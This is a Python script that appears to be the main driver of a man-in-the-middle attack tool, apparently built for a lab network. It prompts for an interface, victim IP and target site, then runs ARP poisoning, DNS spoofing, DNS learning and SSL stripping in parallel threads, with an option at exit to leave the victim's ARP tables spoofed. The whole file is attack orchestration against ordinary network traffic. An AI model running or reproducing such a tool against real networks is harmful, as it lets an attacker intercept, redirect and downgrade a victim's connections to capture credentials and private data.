from arp_poisoning import ARPPoison
from dns_spoofing import DNSSpoof
from dns_learner import DNSLearner
from ssl_stripping import SSLStrip

import scapy.all as scapy
import logging
import threading
import time

def setup():
    # Setup attack
    try:
        iface = input("> Interface: ")
        victim = input("> Victim IP: ")
        site = input("> Website IP: ")
        while True:
            try:
                timer = int(input("> Aggressiveness (1-10): "))
                if 1 <= timer <= 10:
                    break
                else:
                    print(">! Integer must be between 1 and 10.")
            except ValueError:
                print(">! Please enter an integer.")
    except KeyboardInterrupt:
        print("> Poisoning aborted. Exiting...")
        exit(0)

    return iface, victim, site, timer

def run(iface, victim, site, timer):
    stop_event = threading.Event()

    # Poison ARP in a separate thread (to maintain MitM position)
    arp = ARPPoison(iface, victim, site)
    arp_thread = threading.Thread(
        target=arp.attack,
        args=(timer, stop_event,)
    )

    # Learn DNS in a separate thread
    # TODO Does not work. Look into it
    dns_learner = DNSLearner(iface, arp)
    dns_learn_thread = threading.Thread(
        target=dns_learner.start,
        args=(stop_event,)
    )

    # Spoof DNS in a separate thread
    dns_spoofer = DNSSpoof(iface, victim, site)
    dns_sniff_thread = threading.Thread(
        target=dns_spoofer.start,
        args=(stop_event,)
    )

    # Strip SSL in a separate thread
    ssl_stripper = SSLStrip(iface, victim, site)
    ssl_thread = threading.Thread(
        target=ssl_stripper.start,
        args=(stop_event,)
    )

    arp_thread.start()
    dns_learn_thread.start()
    dns_sniff_thread.start()
    ssl_thread.start()

    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        # Program should stop on CTRL+C
        stop_event.set()

        arp_thread.join()
        dns_learn_thread.join()
        dns_sniff_thread.join()
        ssl_thread.join()

        dns_spoofer.disable_dns_block()

        restore = input("> Restore ARP tables? [Y/N] ").strip().lower()
        if restore == 'y' or restore == 'yes':
            arp.restore_tables(arp.victimIP, arp.websiteIP, arp.victimMAC, arp.websiteMAC)
            if arp.dnsIP:
                arp.restore_tables(arp.victimIP, arp.dnsIP, arp.victimMAC, arp.dnsMAC)
            print("> ARP tables restored. Exiting...")
            exit(0)
        else:
            print("> ARP tables left spoofed. Exiting...")
            exit(0)

if __name__ == "__main__":
    scapy.conf.verb = 0
    logging.getLogger("scapy").setLevel(logging.ERROR)

    #iface, victim, site, timer = setup()
    #run(iface, victim, site, timer)

    # TODO: Eventually remove this and uncomment the lines above
    run("eth0", "172.18.0.10", "172.18.0.30", 5)
